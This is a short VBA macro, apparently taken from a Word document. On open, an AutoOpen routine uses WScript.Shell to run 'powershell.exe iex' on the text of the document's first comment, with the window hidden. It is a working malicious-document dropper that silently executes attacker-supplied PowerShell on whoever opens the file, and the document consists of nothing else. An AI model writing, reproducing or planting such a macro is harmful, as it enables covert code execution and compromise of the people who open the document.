Sub AutoOpen()
    Call Macro_Mark_4
End Sub

Sub Macro_Mark_4()
'
' Macro_Mark_4 Macro
'
'



Set shell_object = CreateObject("WScript.Shell")
shell_object.Run "powershell.exe -NoLogo iex " & ActiveDocument.Comments(1).Range.Text, 0
End Sub
